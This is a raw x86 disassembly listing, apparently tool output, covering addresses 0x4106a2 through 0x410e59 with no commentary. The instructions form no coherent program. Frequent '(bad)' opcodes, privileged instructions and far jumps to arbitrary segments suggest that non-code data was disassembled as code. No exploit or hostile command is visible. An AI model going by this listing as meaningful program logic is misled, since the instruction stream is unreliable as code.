  4106a2:	test   ah,dh
  4106a4:	retf   
  4106a5:	xchg   edx,eax
  4106a6:	pop    esi
  4106a7:	inc    esi
  4106a8:	pop    eax
  4106a9:	ss hlt 
  4106ab:	repnz xrelease mov BYTE PTR [ecx],ah
  4106af:	jp     0x410672
  4106b1:	push   esi
  4106b2:	push   edx
  4106b3:	aaa    
  4106b4:	sbb    al,0x0
  4106b6:	add    al,0x58
  4106b8:	inc    edx
  4106b9:	mov    bl,0xe4
  4106bb:	xchg   ebp,eax
  4106bc:	jmp    0x29b0e3f9
  4106c1:	push   ebx
  4106c2:	add    BYTE PTR [eax-0x2e],cl
  4106c5:	bswap  edi
  4106c7:	(bad)  
  4106c8:	fwait
  4106c9:	jg     0x410737
  4106cb:	dec    esp
  4106cc:	push   ecx
  4106cd:	and    BYTE PTR [edi],al
  4106cf:	dec    esp
  4106d0:	sahf   
  4106d1:	outs   dx,DWORD PTR ds:[esi]
  4106d2:	imul   edi,edi,0xffffff92
  4106d5:	adc    bh,BYTE PTR [ebx+0x65]
  4106d8:	loopne 0x410748
  4106da:	ja     0x410756
  4106dc:	cld    
  4106dd:	loope  0x41072e
  4106df:	cwde   
  4106e0:	sub    BYTE PTR [ebp+0x9],bl
  4106e3:	jmp    0x33d9:0x58f05fc4
  4106ea:	push   ds
  4106eb:	fwait
  4106ec:	push   esp
  4106ed:	mov    al,0xc
  4106ef:	xchg   edx,eax
  4106f0:	pop    edi
  4106f1:	xor    BYTE PTR [ecx+0x76aa1d02],0xb6
  4106f8:	icebp  
  4106f9:	fs (bad) 
  4106fb:	das    
  4106fc:	shl    DWORD PTR [eax-0x353b6059],0x4d
  410703:	es int3 
  410705:	add    cl,BYTE PTR [ebx-0x42fe2255]
  41070b:	dec    esp
  41070c:	push   ds
  41070d:	jecxz  0x4106c8
  41070f:	pop    edx
  410710:	cld    
  410711:	stc    
  410712:	ds test al,0x89
  410715:	cmc    
  410716:	cmp    BYTE PTR [esi-0x12],cl
  410719:	mov    ecx,0x12bafced
  41071e:	out    dx,eax
  41071f:	fiadd  WORD PTR [esi]
  410721:	xchg   edx,eax
  410722:	mov    bl,0xa8
  410724:	popa   
  410725:	mov    dh,0x63
  410727:	in     eax,dx
  410728:	or     esi,0xe16eb6fe
  41072e:	jne    0x410712
  410730:	pop    ds
  410731:	fdiv   DWORD PTR [ecx+0x20]
  410734:	sub    eax,0xe1fadfa4
  410739:	fld    QWORD PTR [edx+0x2853ecdd]
  41073f:	inc    esp
  410740:	sbb    al,0x6d
  410742:	cld    
  410743:	lahf   
  410744:	lock lds edx,FWORD PTR [edx+0x43]
  410748:	test   al,0x6d
  41074a:	sar    DWORD PTR [ebx],cl
  41074c:	fidivr WORD PTR [ebx+eax*8]
  41074f:	ss xor ecx,0x53
  410753:	popf   
  410754:	cwde   
  410755:	mov    dh,0x86
  410757:	mov    bl,cl
  410759:	int    0x85
  41075b:	jnp    0x4107c6
  41075d:	add    al,BYTE PTR [eax]
  41075f:	and    bh,BYTE PTR cs:[edi]
  410762:	adc    BYTE PTR [ebp-0x7a328a1e],0xc
  410769:	jmp    0x9fdd:0xa7adacfa
  410770:	xor    al,0xf6
  410772:	out    0x69,eax
  410774:	or     al,0x87
  410776:	jae    0x4107ca
  410778:	test   eax,0xf73f55c2
  41077d:	xchg   ecx,eax
  41077e:	call   0x2675:0xb02f4ea2
  410785:	pop    ss
  410786:	push   edi
  410787:	jne    0x4107f1
  410789:	jmp    0x41072c
  41078b:	jl     0x4107f2
  41078d:	dec    eax
  41078e:	inc    esp
  41078f:	mov    dl,0xc9
  410791:	loop   0x41077e
  410793:	fstp   DWORD PTR [ebp+0x2ad89586]
  410799:	sbb    dh,BYTE PTR [edx]
  41079b:	icebp  
  41079c:	push   esi
  41079d:	mov    ebp,0x11186bf
  4107a2:	xlat   BYTE PTR ds:[ebx]
  4107a3:	mov    edi,0xa3b77c90
  4107a8:	ret    
  4107a9:	xlat   BYTE PTR ds:[ebx]
  4107aa:	jle    0x410766
  4107ac:	mov    dl,0x92
  4107ae:	adc    BYTE PTR [edx-0x219808c2],ah
  4107b4:	and    BYTE PTR ds:0x1f2e9678,ah
  4107ba:	out    dx,al
  4107bb:	clc    
  4107bc:	pop    ebp
  4107bd:	sar    ebx,cl
  4107bf:	icebp  
  4107c0:	xchg   BYTE PTR [edx+0xf1131cf],ah
  4107c6:	xchg   esi,eax
  4107c7:	fucomp st(1)
  4107c9:	adc    dh,BYTE PTR [ebx+edi*8-0x1d]
  4107cd:	jp     0x4107ca
  4107cf:	or     al,0xe3
  4107d1:	cmp    DWORD PTR [eax+0x60c4ed58],esp
  4107d7:	and    cl,0xe2
  4107da:	out    dx,eax
  4107db:	stos   BYTE PTR es:[edi],al
  4107dc:	mov    dh,0xc3
  4107de:	call   0x828e:0x6638d53d
  4107e5:	or     ch,BYTE PTR [ebx]
  4107e7:	adc    al,0x90
  4107e9:	out    0xea,eax
  4107eb:	and    DWORD PTR [esp-0x3733693a],edx
  4107f2:	mov    cl,0x51
  4107f4:	mov    ch,BYTE PTR ds:0x5aaba430
  4107fa:	stos   DWORD PTR es:[edi],eax
  4107fb:	xchg   ebp,eax
  4107fc:	pop    ebx
  4107fd:	jns    0x4107a2
  4107ff:	jne    0x410795
  410801:	or     cl,BYTE PTR [esi]
  410803:	sub    bh,dl
  410805:	inc    ecx
  410806:	and    DWORD PTR [ebx],edx
  410808:	les    esp,FWORD PTR [esi+0x4bdeddff]
  41080e:	sub    BYTE PTR [esi+0x6f],cl
  410811:	jb     0x410826
  410813:	fnsave [ebx-0x20]
  410816:	add    eax,DWORD PTR es:0x721e0e00
  41081d:	sbb    BYTE PTR [esi],al
  41081f:	rcr    BYTE PTR [esi],cl
  410821:	dec    edx
  410822:	jo     0x4107aa
  410824:	(bad)  
  410825:	mov    ?,WORD PTR [ebx+0x7265f073]
  41082b:	jle    0x410838
  41082d:	or     al,0x43
  41082f:	push   esp
  410830:	cmc    
  410831:	jmp    0x41086f
  410833:	pop    ecx
  410834:	sub    ebp,DWORD PTR [edi]
  410836:	pop    eax
  410837:	in     al,dx
  410838:	test   ch,0x69
  41083b:	xor    BYTE PTR [edx+edi*4-0xd],ch
  41083f:	int    0xa2
  410841:	cmp    esi,eax
  410843:	ror    BYTE PTR [eax+0x5c],1
  410846:	xlat   BYTE PTR ds:[ebx]
  410847:	dec    esi
  410848:	pusha  
  410849:	mov    edi,0x6fd5de1
  41084e:	mov    edi,0x65fa9b49
  410853:	(bad)  
  410854:	mov    BYTE PTR [ebx+0x3],al
  410857:	mov    esp,0x2e2d2afe
  41085c:	lahf   
  41085d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41085e:	pusha  
  41085f:	(bad)  
  410860:	push   edx
  410861:	mov    dh,0x5b
  410863:	push   es
  410864:	jmp    0x410898
  410866:	jmp    0x4108aa
  410868:	call   0x2a68:0xa67409fd
  41086f:	adc    esp,DWORD PTR [edi-0x53]
  410872:	mov    edx,0x14fd5c13
  410877:	xchg   esi,eax
  410878:	add    bl,BYTE PTR [edi]
  41087a:	cli    
  41087b:	icebp  
  41087c:	add    al,0xf5
  41087e:	gs ins DWORD PTR es:[edi],dx
  410880:	popf   
  410881:	xor    al,0x20
  410883:	sub    ah,BYTE PTR [ebp+0x217c7e4c]
  410889:	jmp    0x279c6ed1
  41088e:	inc    esp
  41088f:	ins    BYTE PTR es:[edi],dx
  410890:	mov    BYTE PTR [edx],0x56
  410893:	jl     0x410817
  410895:	xchg   ebp,eax
  410896:	cmp    ebx,DWORD PTR [edi]
  410898:	mov    ebx,0x9f9167dc
  41089d:	cs push ds
  41089f:	mov    eax,ds:0xf8657707
  4108a4:	aas    
  4108a5:	push   ebp
  4108a6:	push   0xffffff96
  4108a8:	cmp    al,0x24
  4108aa:	lds    ebx,FWORD PTR [edi]
  4108ac:	adc    eax,0xb1ae0d1
  4108b1:	push   0x6f
  4108b3:	fld    DWORD PTR [esi-0x66]
  4108b6:	add    eax,0x596d0082
  4108bb:	cmp    DWORD PTR [ebx],esp
  4108bd:	rcl    edx,1
  4108bf:	jne    0x4108ab
  4108c1:	fmulp  st(2),st
  4108c3:	sub    al,0x5b
  4108c5:	dec    edx
  4108c6:	xor    DWORD PTR [edx+0x2dcd9a7d],ebx
  4108cc:	mov    ebp,0xf339cf01
  4108d1:	mov    esp,0x5caec918
  4108d6:	jmp    0xdcd1:0x4e7ce0c9
  4108dd:	xor    ecx,edx
  4108df:	add    edx,esp
  4108e1:	sahf   
  4108e2:	or     eax,0x662c8985
  4108e7:	and    ch,ch
  4108e9:	mov    eax,ds:0x8bc6809
  4108ee:	ret    
  4108ef:	ret    0x2143
  4108f2:	retf   
  4108f3:	neg    DWORD PTR [ebx+ebp*8]
  4108f6:	in     eax,0x16
  4108f8:	add    eax,0x5f767f5c
  4108fd:	outs   dx,DWORD PTR ds:[esi]
  4108fe:	pop    ebx
  4108ff:	or     esp,ebx
  410901:	sbb    eax,0x2f50ee28
  410906:	jle    0x410914
  410908:	out    0x3c,al
  41090a:	push   cs
  41090b:	retf   0x7e0c
  41090e:	stc    
  41090f:	mov    bl,0xe5
  410911:	sub    ebx,eax
  410913:	or     dh,BYTE PTR [esp+eiz*2]
  410916:	dec    edi
  410917:	mul    DWORD PTR [ebx]
  410919:	jg     0x410968
  41091b:	gs jmp 0x410941
  41091e:	and    al,0x81
  410920:	adc    dh,BYTE PTR [ebx+eax*8+0x3cecec54]
  410927:	adc    DWORD PTR [ebp-0x77],ebx
  41092a:	(bad)  
  41092b:	jmp    0x8258:0x2cff110e
  410932:	mov    cl,0x42
  410934:	inc    ebx
  410935:	cld    
  410936:	cli    
  410937:	xor    esp,DWORD PTR [ebp+0x65e95328]
  41093d:	or     esp,DWORD PTR [edi]
  41093f:	je     0x410999
  410941:	dec    esp
  410942:	fadd   QWORD PTR [ebx-0x43]
  410945:	push   ss
  410946:	adc    ebp,DWORD PTR [edx+0xd15da00]
  41094c:	sub    BYTE PTR [ecx-0x5a],ch
  41094f:	xchg   edx,eax
  410950:	jne    0x410966
  410952:	sbb    edx,DWORD PTR [edx-0x1b]
  410955:	or     BYTE PTR [ecx-0x24],cl
  410958:	fs loop 0x410999
  41095b:	shl    ch,0xf3
  41095e:	(bad)
  410961:	cwde   
  410962:	scas   eax,DWORD PTR es:[edi]
  410963:	cmp    ah,bh
  410965:	dec    ecx
  410966:	xor    eax,0x3992f55f
  41096b:	jae    0x4109eb
  41096d:	jg     0x410920
  41096f:	sub    al,BYTE PTR [edi+0x3b]
  410972:	pop    ebx
  410973:	jl     0x410981
  410975:	mov    cl,0x42
  410977:	adc    eax,ecx
  410979:	into   
  41097a:	mov    BYTE PTR [esi-0x1946fcb3],cl
  410980:	jge    0x4109f9
  410982:	fwait
  410983:	mov    eax,DWORD PTR [ebp+ebx*2-0x17bb7248]
  41098a:	push   edx
  41098b:	or     al,ch
  41098d:	mov    eax,ds:0xba5d6bc1
  410992:	popa   
  410993:	(bad)  
  410995:	daa    
  410996:	loop   0x410949
  410998:	ins    BYTE PTR es:[edi],dx
  410999:	xchg   edi,eax
  41099a:	into   
  41099b:	dec    edi
  41099c:	mov    ds:0xd46c99a4,eax
  4109a1:	rcr    BYTE PTR [esi-0x3baf50b4],1
  4109a7:	clc    
  4109a8:	adc    bl,ch
  4109aa:	in     al,0x2f
  4109ac:	dec    ebp
  4109ad:	arpl   WORD PTR [ecx-0x22b08b51],dx
  4109b3:	cmp    edi,DWORD PTR [edx-0x12]
  4109b6:	jno    0x41096e
  4109b8:	xor    ch,BYTE PTR [esi+0x2c]
  4109bb:	ins    DWORD PTR es:[edi],dx
  4109bc:	cli    
  4109bd:	xchg   edx,eax
  4109be:	mov    esi,0xd7df4aac
  4109c3:	cld    
  4109c4:	ins    DWORD PTR es:[edi],dx
  4109c5:	repz ret 0xd73a
  4109c9:	mov    cl,0xaa
  4109cb:	jle    0x410a3e
  4109cd:	dec    ecx
  4109ce:	mov    ds:0x5b3430e0,al
  4109d3:	ror    DWORD PTR [edx-0x680bf959],0xa9
  4109da:	push   esp
  4109db:	push   esp
  4109dc:	shr    BYTE PTR ds:0xb65a4bab,1
  4109e2:	xchg   edi,eax
  4109e3:	wrmsr  
  4109e5:	jnp    0x410a4d
  4109e7:	push   ebp
  4109e8:	or     al,0x6b
  4109ea:	pop    ebp
  4109eb:	push   edx
  4109ec:	jmp    0x6e86ae55
  4109f1:	inc    ecx
  4109f2:	xchg   edi,eax
  4109f3:	dec    ecx
  4109f4:	mov    al,0x30
  4109f6:	push   ds
  4109f7:	dec    ebp
  4109f8:	fisttp DWORD PTR [esi-0x32cdf97f]
  4109fe:	push   edx
  4109ff:	mov    cl,0xef
  410a01:	mov    edi,0x6b25139f
  410a06:	pop    ebx
  410a07:	imul   edx,ecx,0xfa99ea14
  410a0d:	dec    eax
  410a0e:	bound  eax,QWORD PTR [ebp-0x22]
  410a11:	push   ebx
  410a12:	dec    ebp
  410a13:	in     al,0xa6
  410a15:	or     al,0xc6
  410a17:	and    DWORD PTR [edx],edx
  410a19:	cdq    
  410a1a:	out    0x97,al
  410a1c:	pop    edi
  410a1d:	mov    edx,0x8ab599c0
  410a22:	mov    eax,0x106f4932
  410a27:	stc    
  410a28:	dec    eax
  410a29:	xchg   DWORD PTR ds:0x824a49b1,eax
  410a2f:	arpl   WORD PTR [ebp+0x6cac67f0],dx
  410a35:	repnz not DWORD PTR [eax-0x78ddb459]
  410a3c:	or     edi,DWORD PTR ds:0x43e6d0e3
  410a42:	push   es
  410a43:	dec    esi
  410a44:	shr    eax,cl
  410a46:	mov    ebp,0x32da52a7
  410a4b:	fisttp DWORD PTR [edx]
  410a4d:	popa   
  410a4e:	mov    edx,0x8e9e16da
  410a53:	jp     0x410ace
  410a55:	nop
  410a56:	xchg   DWORD PTR [eax+eiz*1+0x15],esp
  410a5a:	mov    ecx,0x94d5be37
  410a5f:	xchg   ecx,eax
  410a60:	mov    BYTE PTR [ecx],bh
  410a62:	jmp    0x45ea0b1f
  410a67:	jno    0x1b1ea95d
  410a6d:	dec    ebx
  410a6e:	enter  0xab63,0xf9
  410a72:	call   0xcc2b845f
  410a77:	rcl    dh,cl
  410a79:	fisubr WORD PTR [ebp-0x783c884a]
  410a7f:	dec    ecx
  410a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a81:	and    eax,0xb0fae115
  410a86:	test   edi,edi
  410a88:	jo     0x410a95
  410a8a:	imul   edx,DWORD PTR [edi-0x25],0xffffffa6
  410a8e:	cli    
  410a8f:	sysexit 
  410a91:	sbb    esp,DWORD PTR [edx+0x4a]
  410a94:	dec    esi
  410a95:	mov    ecx,0xeb51a191
  410a9a:	jbe    0x410a40
  410a9c:	mov    eax,0x13615761
  410aa1:	rcl    DWORD PTR [ebx+0x1c],1
  410aa4:	cmp    eax,0x7340fa16
  410aa9:	(bad)  [edx+0x27]
  410aac:	cmp    eax,ecx
  410aae:	sub    BYTE PTR [ebx],ah
  410ab0:	test   eax,0x50837fca
  410ab5:	lods   al,BYTE PTR ds:[esi]
  410ab6:	xchg   esi,eax
  410ab7:	sar    BYTE PTR [edi-0x3ea340ca],cl
  410abd:	cs sub eax,0x43216c6b
  410ac3:	mov    eax,0x9318a214
  410ac8:	inc    edx
  410ac9:	imul   ebp,esi,0x9
  410acc:	push   ebp
  410acd:	aam    0x37
  410acf:	jp     0x410b0d
  410ad1:	fbstp  TBYTE PTR [ebx+0xe81a53d]
  410ad7:	jo     0x410ae5
  410ad9:	push   edi
  410ada:	pushf  
  410adb:	cmp    BYTE PTR [edx+0x3566d62c],dl
  410ae1:	mov    ecx,0x8e1ce0d5
  410ae6:	mov    dh,0x3
  410ae8:	or     al,0xea
  410aea:	leave  
  410aeb:	aas    
  410aec:	ss pop edx
  410aee:	loop   0x410b1c
  410af0:	dec    esp
  410af1:	mov    edi,DWORD PTR [esi+0x7a]
  410af4:	aad    0xdb
  410af6:	ss ins BYTE PTR es:[edi],dx
  410af8:	and    dl,BYTE PTR [edi]
  410afa:	mov    ds:0x21f18258,eax
  410aff:	sbb    DWORD PTR [ebx],edx
  410b01:	xchg   ebx,eax
  410b02:	sbb    BYTE PTR [eax+0x6f4493c3],al
  410b08:	sub    DWORD PTR [edx],ebp
  410b0a:	jmp    0xe8e7:0x344075dd
  410b11:	sbb    dh,BYTE PTR [ebx+0x68]
  410b14:	retf   
  410b15:	lahf   
  410b16:	jge    0x410ae8
  410b18:	push   cs
  410b19:	fwait
  410b1a:	aam    0x33
  410b1c:	loope  0x410b7a
  410b1e:	and    DWORD PTR [ebp-0x5b0d6ff0],0xffffffa7
  410b25:	jnp    0x410ada
  410b27:	add    BYTE PTR [esi-0x34b08079],ah
  410b2d:	dec    ecx
  410b2e:	jo     0x410afa
  410b30:	dec    eax
  410b31:	add    al,0x91
  410b33:	rcr    DWORD PTR [edi],cl
  410b35:	jae    0x410ba8
  410b37:	push   cs
  410b38:	inc    eax
  410b39:	psubw  mm5,mm0
  410b3c:	inc    ecx
  410b3d:	fdivr  QWORD PTR [esp+ebx*1]
  410b40:	pop    es
  410b41:	and    DWORD PTR [esi+0x489484de],0x6b
  410b48:	inc    esi
  410b49:	sub    al,0x40
  410b4b:	inc    eax
  410b4c:	push   ds
  410b4d:	les    edi,FWORD PTR [edx+0x6129cfb7]
  410b53:	mov    esi,eax
  410b55:	fdiv   DWORD PTR [ebp+eiz*4+0x2fc51147]
  410b5c:	scas   eax,DWORD PTR es:[edi]
  410b5d:	test   al,0xa
  410b5f:	mov    dh,0xd2
  410b61:	mov    esi,0x329521a
  410b66:	aam    0xdd
  410b68:	leave  
  410b69:	and    eax,0x8d10a37a
  410b6e:	sti    
  410b6f:	jle    0x410bae
  410b71:	outs   dx,DWORD PTR ds:[esi]
  410b72:	push   edx
  410b73:	les    ecx,FWORD PTR [ecx+edx*2+0x2b]
  410b77:	aam    0x71
  410b79:	jno    0x410bf2
  410b7b:	xchg   BYTE PTR [edx+ebx*2],dl
  410b7e:	stc    
  410b7f:	icebp  
  410b80:	and    al,0x38
  410b82:	ins    BYTE PTR es:[edi],dx
  410b83:	mov    dh,0xfd
  410b85:	inc    esp
  410b86:	jb     0x410b68
  410b88:	jle    0x410b0b
  410b8a:	and    edi,DWORD PTR [eax-0x5e]
  410b8d:	nop
  410b8e:	and    ah,BYTE PTR [eax]
  410b90:	and    DWORD PTR [ebx],ebp
  410b92:	enter  0x46a6,0x3c
  410b96:	jo     0x410bdc
  410b98:	aaa    
  410b99:	loop   0x410b38
  410b9b:	jmp    0x410bef
  410b9d:	pop    es
  410b9e:	ffreep st(1)
  410ba0:	mov    edx,DWORD PTR ds:0x3a532ade
  410ba6:	aas    
  410ba7:	pop    esi
  410ba8:	call   0x981c:0xd8748fda
  410baf:	int3   
  410bb0:	inc    edi
  410bb1:	(bad)
  410bb4:	mov    eax,0x92c8a1d1
  410bb9:	mov    dl,0x91
  410bbb:	mov    ebp,es
  410bbd:	in     al,0x3
  410bbf:	fild   WORD PTR [edi-0x2]
  410bc2:	pop    ds
  410bc3:	aaa    
  410bc4:	add    dl,BYTE PTR [esi]
  410bc6:	scas   al,BYTE PTR es:[edi]
  410bc7:	sbb    al,0x11
  410bc9:	jae    0x410bcd
  410bcb:	inc    ecx
  410bcc:	xchg   ebx,eax
  410bcd:	in     al,dx
  410bce:	repz sbb dl,BYTE PTR [edx-0x74f00a88]
  410bd5:	cmc    
  410bd6:	ret    
  410bd7:	pop    es
  410bd8:	pop    esi
  410bd9:	sub    DWORD PTR [esi],ebx
  410bdb:	aaa    
  410bdc:	xchg   edi,eax
  410bdd:	xlat   BYTE PTR ds:[ebx]
  410bde:	and    BYTE PTR [edx+0x2f],cl
  410be1:	mov    edi,DWORD PTR [ecx+0x22]
  410be4:	cs cdq 
  410be6:	stos   BYTE PTR es:[edi],al
  410be7:	cld    
  410be8:	adc    ebx,DWORD PTR [ecx]
  410bea:	sub    BYTE PTR [edi+0xb],bh
  410bed:	xor    eax,0xbedba8f4
  410bf2:	int    0x67
  410bf4:	stos   DWORD PTR es:[edi],eax
  410bf5:	jl     0x410b85
  410bf7:	rol    DWORD PTR [edx-0x5bbbae52],cl
  410bfd:	aaa    
  410bfe:	fdivr  QWORD PTR [ecx]
  410c00:	cmp    ch,BYTE PTR [esi-0x2a]
  410c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c04:	adc    DWORD PTR [eax],ebp
  410c06:	imul   ebx,eax,0xddba64c6
  410c0c:	or     dh,BYTE PTR [eax+0x13dcbf3b]
  410c12:	cmp    al,0xb
  410c14:	xchg   edi,eax
  410c15:	inc    ecx
  410c16:	fcomp  QWORD PTR [edi+0x6c]
  410c19:	(bad)  [edx+0x38875e6f]
  410c1f:	(bad)  
  410c20:	jmp    0x410c4c
  410c22:	js     0x410bc7
  410c24:	push   eax
  410c25:	lds    ebx,FWORD PTR [esp+edi*4+0x4ef4cfbc]
  410c2c:	dec    esp
  410c2d:	cmp    BYTE PTR [edi+0xd],dl
  410c30:	sbb    ch,al
  410c32:	add    BYTE PTR [ecx-0x251daed0],cl
  410c38:	fwait
  410c39:	and    BYTE PTR [ecx-0x47],dh
  410c3c:	fsubr  DWORD PTR ds:0x22e25833
  410c42:	nop
  410c43:	popf   
  410c44:	jmp    0xc545:0x71b58fde
  410c4b:	add    al,0x4f
  410c4d:	shl    ah,0x4a
  410c50:	inc    edx
  410c51:	mov    eax,ds:0xac691be7
  410c56:	data16 cmc 
  410c58:	daa    
  410c59:	push   edx
  410c5a:	push   ebx
  410c5b:	je     0x410c2b
  410c5d:	out    dx,eax
  410c5e:	pop    ebp
  410c5f:	sbb    DWORD PTR [ebx],esi
  410c61:	aam    0xaa
  410c63:	aad    0xa4
  410c65:	daa    
  410c66:	xchg   ebp,eax
  410c67:	(bad)  
  410c68:	loop   0x410bf1
  410c6a:	pop    edi
  410c6b:	mov    dl,0xda
  410c6d:	and    ecx,edi
  410c6f:	xchg   BYTE PTR [ebx+0x6358f924],dh
  410c75:	sbb    BYTE PTR [edi],ah
  410c77:	int    0xff
  410c79:	rep outs dx,BYTE PTR ds:[esi]
  410c7b:	sbb    eax,0xab5b6d6d
  410c80:	daa    
  410c81:	mov    ds:0x8bc2514c,al
  410c86:	outs   dx,DWORD PTR ds:[esi]
  410c87:	push   ds
  410c88:	pop    edi
  410c89:	dec    esp
  410c8a:	inc    edx
  410c8b:	mov    edi,0x141e95c6
  410c90:	or     BYTE PTR [eax-0x3b],dh
  410c93:	mov    ebx,0xad6de5c0
  410c98:	jnp    0x410c86
  410c9a:	call   FWORD PTR [edx]
  410c9c:	inc    esi
  410c9d:	imul   edx,DWORD PTR [ebx],0xd84b917f
  410ca3:	cwde   
  410ca4:	push   ebx
  410ca5:	or     BYTE PTR [ebx+0x78],0x35
  410ca9:	pop    ss
  410caa:	out    0x3f,al
  410cac:	xlat   BYTE PTR ds:[ebx]
  410cad:	popf   
  410cae:	jg     0x410d12
  410cb0:	daa    
  410cb1:	xchg   ebx,eax
  410cb2:	test   eax,0x635c6fc9
  410cb7:	leave  
  410cb8:	loop   0x410cb2
  410cba:	(bad)  
  410cbb:	pop    ebp
  410cbc:	xchg   edi,eax
  410cbd:	pop    es
  410cbe:	test   DWORD PTR [ecx],esp
  410cc0:	fwait
  410cc1:	into   
  410cc2:	add    DWORD PTR [edx-0x11765507],ebp
  410cc8:	inc    esp
  410cc9:	sbb    al,0x90
  410ccb:	inc    ebp
  410ccc:	jne    0x410ca3
  410cce:	fwait
  410ccf:	(bad)  
  410cd0:	iret   
  410cd1:	inc    ecx
  410cd2:	adc    ah,BYTE PTR [edi-0x54]
  410cd5:	and    DWORD PTR [edi],0xffffffc7
  410cd8:	sbb    eax,0x7bf4b8e5
  410cdd:	imul   eax,esp,0xd
  410ce0:	mov    ch,0xe5
  410ce2:	xchg   ecx,eax
  410ce3:	jb     0x410ce6
  410ce5:	sbb    DWORD PTR [edx+eax*4-0x123480e2],edi
  410cec:	(bad)  
  410ced:	push   cs
  410cee:	cmp    bh,BYTE PTR [edx+0x3e81c596]
  410cf4:	mov    eax,ds:0x42d8eddb
  410cf9:	bound  esp,QWORD PTR [ebp+0x39]
  410cfc:	pop    ebx
  410cfd:	shl    dl,cl
  410cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d00:	fiadd  WORD PTR [ebx+0x3afe3187]
  410d06:	sub    DWORD PTR [ebx+0x46fe78e2],ecx
  410d0c:	jle    0x410cc5
  410d0e:	adc    bl,dl
  410d10:	cmc    
  410d11:	mov    al,0x85
  410d13:	test   edi,edx
  410d15:	push   0x75e621b7
  410d1a:	inc    eax
  410d1b:	in     al,dx
  410d1c:	pop    esi
  410d1d:	add    al,0xce
  410d1f:	inc    esp
  410d20:	dec    ecx
  410d21:	mov    ah,0x5b
  410d23:	adc    ecx,DWORD PTR [edx]
  410d25:	hlt    
  410d26:	xchg   ebp,eax
  410d27:	in     eax,0xc3
  410d29:	lods   eax,DWORD PTR ds:[esi]
  410d2a:	popf   
  410d2b:	jmp    0x7ed2:0x8e066a3d
  410d32:	mov    dh,0x53
  410d34:	xor    ecx,DWORD PTR [ecx+esi*2]
  410d37:	stc    
  410d38:	sub    esi,ebp
  410d3a:	shl    DWORD PTR [esi+esi*2-0x18],1
  410d3e:	addr16 add eax,0x686bfc1e
  410d44:	fcmovne st,st(3)
  410d46:	pop    eax
  410d47:	xchg   esp,eax
  410d48:	and    eax,0x538ba0b1
  410d4d:	std    
  410d4e:	fsubr  st(7),st
  410d50:	ret    
  410d51:	mov    WORD PTR [eax-0x5f0f3157],?
  410d57:	sbb    esp,DWORD PTR [ebx+edx*2+0x1a838c79]
  410d5e:	bound  eax,QWORD PTR [ecx]
  410d60:	rcr    BYTE PTR [edi],1
  410d62:	sub    edx,ecx
  410d64:	xor    dl,cl
  410d66:	bound  ecx,QWORD PTR [ecx-0x2974a21e]
  410d6c:	add    eax,DWORD PTR [ebp+0x5]
  410d6f:	jmp    0xc076d37b
  410d74:	dec    ebx
  410d75:	fsubr  st,st(7)
  410d77:	sub    DWORD PTR [ebp+0x5a5ede45],ebp
  410d7d:	cmp    al,0x2
  410d7f:	addr16 pop ebp
  410d81:	jl     0x410d76
  410d83:	mov    eax,ds:0x613e62b6
  410d88:	mov    al,0xb9
  410d8a:	stos   BYTE PTR es:[edi],al
  410d8b:	cmp    DWORD PTR [edx],0xfffffff9
  410d8e:	mov    ebx,0x8df895f5
  410d93:	mov    dl,dh
  410d95:	in     al,0x27
  410d97:	push   ds
  410d98:	mov    edx,0xef9fb49a
  410d9d:	xor    al,0x25
  410d9f:	fcmovnb st,st(3)
  410da1:	jle    0x410dc9
  410da3:	mov    dh,0xba
  410da5:	adc    BYTE PTR [esi+esi*4+0x1fd413da],ah
  410dac:	(bad)  
  410dad:	pop    ebp
  410dae:	jmp    0x3be3cb31
  410db3:	inc    ebp
  410db4:	pop    ss
  410db5:	lds    ecx,FWORD PTR [esi+edi*1-0x39eedf24]
  410dbc:	inc    esi
  410dbd:	sub    edx,DWORD PTR [edi]
  410dbf:	sti    
  410dc0:	adc    BYTE PTR [eax],bl
  410dc2:	add    al,0xc8
  410dc4:	xor    eax,0x5308bec9
  410dc9:	or     al,0xe4
  410dcb:	scas   al,BYTE PTR es:[edi]
  410dcc:	mov    DWORD PTR [ebx-0x7828f4a7],edi
  410dd2:	push   ecx
  410dd3:	jmp    0x1c1f:0x7aecd0ba
  410dda:	mov    ah,0x4b
  410ddc:	gs std 
  410dde:	test   al,0x49
  410de0:	jb     0x410dc3
  410de2:	in     eax,0x7f
  410de4:	fisttp WORD PTR ds:[ebx-0x52]
  410de8:	xchg   edx,eax
  410de9:	inc    ebp
  410dea:	dec    esp
  410deb:	jb     0x410e5b
  410ded:	inc    ebp
  410dee:	inc    esi
  410def:	xchg   ebp,eax
  410df0:	popa   
  410df1:	xchg   BYTE PTR [ebx],bh
  410df3:	mov    ah,0x38
  410df5:	dec    ebp
  410df6:	xor    eax,0xa152fe1a
  410dfb:	jmp    0x410e4c
  410dfd:	mov    ch,0x6
  410dff:	(bad)  
  410e01:	sbb    eax,0xa8c1ea8
  410e06:	jo     0x410d94
  410e08:	scas   eax,DWORD PTR es:[edi]
  410e09:	dec    eax
  410e0a:	sbb    ebx,DWORD PTR [ebx+0x28cff981]
  410e10:	sti    
  410e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e12:	test   esp,esi
  410e14:	aas    
  410e15:	push   edx
  410e16:	pop    esi
  410e17:	cmp    eax,DWORD PTR [ecx+esi*2]
  410e1a:	adc    BYTE PTR [ecx+0x3cbb39fb],ah
  410e20:	sar    BYTE PTR [ecx],cl
  410e22:	sti    
  410e23:	xor    ecx,ebp
  410e25:	scas   eax,DWORD PTR es:[edi]
  410e26:	pop    ds
  410e27:	push   0xa32b4ca6
  410e2c:	mov    al,0x26
  410e2e:	retf   0x6dc
  410e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e32:	daa    
  410e33:	push   ss
  410e34:	mov    dh,0x16
  410e36:	test   edi,edi
  410e38:	out    dx,al
  410e39:	inc    edi
  410e3a:	test   BYTE PTR ds:0x62860e05,ah
  410e40:	pop    esp
  410e41:	add    ah,BYTE PTR [eax+0x3d]
  410e44:	or     ebx,eax
  410e46:	icebp  
  410e47:	jbe    0x410e8e
  410e49:	(bad)  
  410e4a:	cmp    DWORD PTR [esi],ebp
  410e4c:	retf   0x4357
  410e4f:	mov    dl,0x97
  410e51:	dec    ebp
  410e52:	adc    DWORD PTR [eax+edx*4-0x431f6a73],ebp
  410e59:	add    eax,0xfaa642e6
